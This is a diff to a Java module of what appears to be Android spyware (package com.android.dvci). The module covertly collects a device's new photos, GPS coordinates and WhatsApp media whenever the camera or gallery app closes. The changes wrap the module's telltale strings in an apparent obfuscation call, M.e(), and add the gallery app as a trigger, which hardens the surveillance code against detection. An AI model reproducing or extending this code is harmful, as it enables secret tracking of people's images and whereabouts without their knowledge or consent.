@@ -23,6 +23,7 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.WChar;
+import com.android.mm.M;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -48,7 +49,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 	@Override
 	protected boolean parse(ConfModule conf) {
 		try {
-			from = conf.getDate("datefrom");
+			from = conf.getDate(M.e("datefrom"));
 		} catch (ConfigurationException e) {
 			Date today = new Date();
 			from = new Date( today.getTime() - (3600 * 24 * 1000) );
@@ -101,7 +102,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 	@Override
 	public int notification(ProcessInfo b) {
-		if (b.processInfo.contains("camera") && b.status == ProcessStatus.STOP) {
+		if ( (b.processInfo.toLowerCase().contains(M.e("camera")) || b.processInfo.toLowerCase().contains(M.e("gallery3d")))
+				&& b.status == ProcessStatus.STOP) {
 			fetchPhotos();
 		}
 		return 0;
@@ -164,7 +166,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 	}
 
 	private boolean isMultimediaChat(String bucket) {
-		return bucket.toLowerCase().contains("whatsapp");
+		return bucket.toLowerCase().contains(M.e("whatsapp"));
 	}
 
 	public static long getCameraImages(Context context, ImageVisitor visitor, long lastTimestamp) {
@@ -175,8 +177,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 		final String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.ImageColumns.DATE_TAKEN,
 				MediaStore.Images.Media.TITLE, MediaStore.Images.Media.MIME_TYPE,
-				MediaStore.Images.ImageColumns.LATITUDE, MediaStore.Images.ImageColumns.LONGITUDE,
-				MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
+						MediaStore.Images.ImageColumns.LATITUDE, MediaStore.Images.ImageColumns.LONGITUDE,
+								MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
 		final String selection = MediaStore.Images.Media.DATE_TAKEN + " > ?";
 		final String[] selectionArgs = {Long.toString(lastTimestamp)};
 		final String order = MediaStore.Images.Media.DATE_TAKEN + " asc";
@@ -187,7 +189,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 				order);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCameraImages), cursor: " + cursor);
+			Check.log(TAG + " (getCameraImages), cursor: " + cursor + " Uri: " + MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
 			Check.log(TAG + " (getCameraImages), selection timestamp: " + selectionArgs[0]);
 		}
 
@@ -216,17 +218,17 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		JSONObject place = new JSONObject();
 		JSONObject main = new JSONObject();
 		try {
-			main.put("program", bucket);
-			main.put("path", path);
+			main.put(M.e("program"), bucket);
+			main.put(M.e("path"), path);
 
 			if (!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon)) {
-				place.put("lat", lat);
-				place.put("lon", lon);
+				place.put(M.e("lat"), lat);
+				place.put(M.e("lon"), lon);
 			}
-			main.put("description", title);
+			main.put(M.e("description"), title);
 			//main.put("device", "android");
-			main.put("mime", mime);
-			main.put("time", timestamp.getTime() / 1000);
+			main.put(M.e("mime"), mime);
+			main.put(M.e("time"), timestamp.getTime() / 1000);
 
 		} catch (JSONException e) {
 			e.printStackTrace();
